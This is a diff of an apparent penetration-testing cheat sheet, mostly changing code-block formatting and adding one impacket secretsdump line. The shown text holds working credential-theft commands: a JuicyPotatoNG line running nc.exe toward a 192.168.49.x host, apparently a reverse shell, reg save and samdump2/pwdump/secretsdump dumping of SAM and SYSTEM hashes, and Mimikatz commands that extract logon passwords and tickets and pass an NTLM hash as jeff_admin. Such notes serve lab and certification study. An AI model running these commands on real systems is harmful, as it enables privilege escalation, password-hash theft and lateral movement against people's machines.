@@ -83,7 +83,8 @@ JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "nc.exe 192.168.49.13
 A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS)\
 Passwords are LM & NTLM hashed\\
 
-```cmd
+{% code overflow="wrap" fullWidth="false" %}
+```bash
 Default file location: 
 C:\Windows\System32\config\SAM
 C:\Windows\System32\config\SYSTEM
@@ -94,10 +95,12 @@ reg save HKLM\System c:\System
 Dumping hashes:
 samdump2 SYSTEM SAM
 pwdump.py SYSTEM SAM    # For Windows 10
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
 
 Format of Hashes:
 [USERNAME]:[RID]:[LMHash]:[NTLMHash]:::   # RID = Relative Identifier
 ```
+{% endcode %}
 
 Ref: https://techgenix.com/how-cracked-windows-password-part2/
 
@@ -202,8 +205,9 @@ tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
 
 ### Mimikatz
 
-```
-./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" “exit”
+{% code overflow="wrap" %}
+```powershell
+./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 # One-liner
 privilege::debug
 token::elevate
@@ -216,6 +220,7 @@ sekurlsa::tickets
 kerberos::list
 sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe    # using ntlm of other user (retrieved from logonpasswords) to execute a program
 ```
+{% endcode %}
 
 ### Powercat
 
